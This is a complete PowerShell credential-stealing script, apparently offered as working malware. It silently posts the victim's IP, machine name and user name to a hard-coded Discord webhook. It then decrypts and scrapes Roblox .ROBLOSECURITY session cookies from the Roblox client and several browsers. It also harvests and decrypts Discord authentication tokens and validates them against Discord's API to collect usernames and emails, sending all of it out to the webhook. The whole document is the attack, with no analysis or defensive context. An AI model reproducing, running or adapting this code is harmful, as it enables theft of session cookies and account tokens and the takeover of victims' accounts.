$ErrorActionPreference = 'SilentlyContinue'
$w = 'https://discord.com/api/webhooks/1543999798452027435/OIcVXPK_yS0I4Fe5svBxlkzw2_yNDzJcdX5CKEsv-wP0KRgQlS1GXpDyAK2JitSYJ13V'

function S($t) {
    try {
        $b = @{ content = $t } | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri $w -Method Post -Body $b -ContentType 'application/json' -UseBasicParsing
    } catch {}
}

# IP
$ip = ''
try { $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org' -UseBasicParsing -TimeoutSec 8).Trim() } catch {}
if (-not $ip) { try { $ip = (Invoke-RestMethod -Uri 'https://ifconfig.me/ip' -UseBasicParsing -TimeoutSec 8).Trim() } catch {} }

S "**Hit**`nIP: ``$ip```nPC: ``$env:COMPUTERNAME```nUser: ``$env:USERNAME``"

Add-Type -AssemblyName System.Security

# ========== ROBLOX ==========
$rbx = @()

# Roblox client DPAPI
$rp = "$env:LOCALAPPDATA\Roblox\LocalStorage\RobloxCookies.dat"
if (Test-Path $rp) {
    try {
        $j = Get-Content $rp -Raw | ConvertFrom-Json
        if ($j.CookiesData) {
            $e = [Convert]::FromBase64String($j.CookiesData)
            $d = $e
            if ($e.Length -gt 5 -and [Text.Encoding]::ASCII.GetString($e[0..4]) -eq 'DPAPI') {
                $d = $e[5..($e.Length - 1)]
            }
            $dec = [Security.Cryptography.ProtectedData]::Unprotect($d, $null, 'CurrentUser')
            $raw = [Text.Encoding]::UTF8.GetString($dec)
            if ($raw -match '\.ROBLOSECURITY') {
                $rbx += "RobloxClient: $raw"
            }
        }
    } catch {}
}

# Browser paths
$bps = @(
    @{ N = 'Chrome';  P = "$env:LOCALAPPDATA\Google\Chrome\User Data" },
    @{ N = 'Edge';    P = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" },
    @{ N = 'Brave';   P = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" },
    @{ N = 'Opera';   P = "$env:APPDATA\Opera Software\Opera Stable" },
    @{ N = 'OperaGX'; P = "$env:APPDATA\Opera Software\Opera GX Stable" },
    @{ N = 'Vivaldi'; P = "$env:LOCALAPPDATA\Vivaldi\User Data" },
    @{ N = 'Yandex';  P = "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data" },
    @{ N = 'Chromium'; P = "$env:LOCALAPPDATA\Chromium\User Data" }
)

foreach ($b in $bps) {
    if (-not (Test-Path $b.P)) { continue }
    $profs = @('Default') + @(Get-ChildItem $b.P -Directory -Filter 'Profile *' -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name)
    foreach ($pr in $profs) {
        $db = Join-Path $b.P "$pr\Network\Cookies"
        if (-not (Test-Path $db)) { $db = Join-Path $b.P "$pr\Cookies" }
        if (-not (Test-Path $db)) { continue }
        $tmp = Join-Path $env:TEMP ([guid]::NewGuid().ToString('N'))
        try {
            Copy-Item $db $tmp -Force
            $tx = [Text.Encoding]::UTF8.GetString([IO.File]::ReadAllBytes($tmp))
            [regex]::Matches($tx, '\.ROBLOSECURITY[_=:\s]*([A-Za-z0-9_\-\.|%]{50,})') | ForEach-Object {
                $v = $_.Groups[1].Value
                if ($v.Length -gt 40) { $rbx += "$($b.N)/$pr : .ROBLOSECURITY=$v" }
            }
            [regex]::Matches($tx, '_\|WARNING:-DO-NOT-SHARE-THIS\.[^|]{20,}') | ForEach-Object {
                $rbx += "$($b.N)/$pr : $($_.Value)"
            }
        } catch {} finally {
            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
        }
    }
}

# Firefox
$ff = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ff) {
    Get-ChildItem $ff -Directory -ErrorAction SilentlyContinue | ForEach-Object {
        $ck = Join-Path $_.FullName 'cookies.sqlite'
        if (Test-Path $ck) {
            $tmp = Join-Path $env:TEMP ([guid]::NewGuid().ToString('N'))
            try {
                Copy-Item $ck $tmp -Force
                $tx = [Text.Encoding]::UTF8.GetString([IO.File]::ReadAllBytes($tmp))
                [regex]::Matches($tx, '\.ROBLOSECURITY[_=:\s]*([A-Za-z0-9_\-\.|%]{50,})') | ForEach-Object {
                    $rbx += "Firefox/$($_.Name) : .ROBLOSECURITY=$($_.Groups[1].Value)"
                }
            } catch {} finally {
                Remove-Item $tmp -Force -ErrorAction SilentlyContinue
            }
        }
    }
}

if ($rbx.Count -gt 0) {
    $c = ($rbx | Select-Object -Unique) -join "`n"
    while ($c.Length -gt 1800) {
        $part = $c.Substring(0, 1800)
        $c = $c.Substring(1800)
        S "**Roblox**`n``````$part``````"
    }
    if ($c) { S "**Roblox**`n``````$c``````" }
} else {
    S "**Roblox**: none"
}

# ========== DISCORD TOKENS ==========
$toks = @()

$paths = @(
    "$env:APPDATA\discord\Local Storage\leveldb",
    "$env:APPDATA\discordcanary\Local Storage\leveldb",
    "$env:APPDATA\discordptb\Local Storage\leveldb",
    "$env:APPDATA\discorddevelopment\Local Storage\leveldb",
    "$env:APPDATA\Lightcord\Local Storage\leveldb",
    "$env:APPDATA\Opera Software\Opera Stable\Local Storage\leveldb",
    "$env:APPDATA\Opera Software\Opera GX Stable\Local Storage\leveldb"
)

$cb = "$env:LOCALAPPDATA\Google\Chrome\User Data"
if (Test-Path $cb) {
    Get-ChildItem $cb -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'Default|Profile' } | ForEach-Object {
        $paths += (Join-Path $_.FullName 'Local Storage\leveldb')
    }
}
$eb = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
if (Test-Path $eb) {
    Get-ChildItem $eb -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'Default|Profile' } | ForEach-Object {
        $paths += (Join-Path $_.FullName 'Local Storage\leveldb')
    }
}
$bb = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
if (Test-Path $bb) {
    Get-ChildItem $bb -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'Default|Profile' } | ForEach-Object {
        $paths += (Join-Path $_.FullName 'Local Storage\leveldb')
    }
}

$rt = '[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}'
$re = 'dQw4w9WgXcQ:[^"]+'

function Get-Key($ls) {
    try {
        $j = Get-Content $ls -Raw | ConvertFrom-Json
        $ek = [Convert]::FromBase64String($j.os_crypt.encrypted_key)
        if ([Text.Encoding]::ASCII.GetString($ek[0..4]) -ne 'DPAPI') { return $null }
        return [Security.Cryptography.ProtectedData]::Unprotect($ek[5..($ek.Length - 1)], $null, 'CurrentUser')
    } catch { return $null }
}

function Dec-Tok($b64, $key) {
    try {
        $r = [Convert]::FromBase64String($b64)
        $n = $r[3..14]
        $c = $r[15..($r.Length - 17)]
        $t = $r[($r.Length - 16)..($r.Length - 1)]
        $a = [Security.Cryptography.AesGcm]::new($key)
        $p = New-Object byte[] $c.Length
        $a.Decrypt($n, $c, $t, $p)
        return [Text.Encoding]::UTF8.GetString($p)
    } catch { return $null }
}

foreach ($p in ($paths | Select-Object -Unique)) {
    if (-not (Test-Path $p)) { continue }
    Get-ChildItem $p -File -Include '*.ldb','*.log' -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            $ct = [IO.File]::ReadAllText($_.FullName)
            [regex]::Matches($ct, $rt) | ForEach-Object {
                $t = $_.Value
                if ($t -notin $toks) { $toks += $t }
            }
            [regex]::Matches($ct, $re) | ForEach-Object {
                $ep = $_.Value -replace '^dQw4w9WgXcQ:', ''
                $par = Split-Path (Split-Path (Split-Path $p))
                $ls = Join-Path $par 'Local State'
                if (-not (Test-Path $ls)) { $ls = "$env:APPDATA\discord\Local State" }
                $k = Get-Key $ls
                if ($k) {
                    $d = Dec-Tok $ep $k
                    if ($d -and $d -match $rt -and $d -notin $toks) { $toks += $d }
                }
            }
        } catch {}
    }
}

$val = @()
foreach ($t in ($toks | Select-Object -Unique)) {
    try {
        $r = Invoke-RestMethod -Uri 'https://discord.com/api/v9/users/@me' -Headers @{ Authorization = $t } -UseBasicParsing -TimeoutSec 6
        $val += "$t | $($r.username) | $($r.id) | $($r.email)"
    } catch {
        $val += "$t (invalid)"
    }
}

if ($val.Count -gt 0) {
    $o = $val -join "`n"
    while ($o.Length -gt 1800) {
        $part = $o.Substring(0, 1800)
        $o = $o.Substring(1800)
        S "**Tokens**`n``````$part``````"
    }
    if ($o) { S "**Tokens**`n``````$o``````" }
} else {
    S "**Tokens**: none"
}

S "**Done**"
